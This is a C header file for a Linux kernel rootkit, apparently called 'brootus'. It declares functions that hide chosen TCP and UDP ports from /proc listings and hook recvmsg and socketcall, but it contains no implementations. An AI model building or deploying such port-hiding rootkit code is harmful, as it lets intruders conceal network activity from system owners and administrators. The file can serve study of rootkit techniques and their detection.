#ifndef SOCKET_HIDING_H
#define SOCKET_HIDING_H

#include <linux/proc_fs.h>

extern void parse_socket_port(char *str_port);
extern void set_socket_ports(char *ports);
extern inline int port_in_list(short port, short *list, int size);
extern inline int hide_tcp_port(short port);
extern inline int hide_udp_port(short port);
extern int rk_tcp4_seq_show(struct seq_file *seq, void *v);
extern int rk_udp4_seq_show(struct seq_file *seq, void *v);
extern struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry *pde, const char *name);
extern long brootus_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags);
extern long rk_socketcall(int call, unsigned long __user *args);
extern void enable_socket_hiding(void);
extern int hide_port(void);

#endif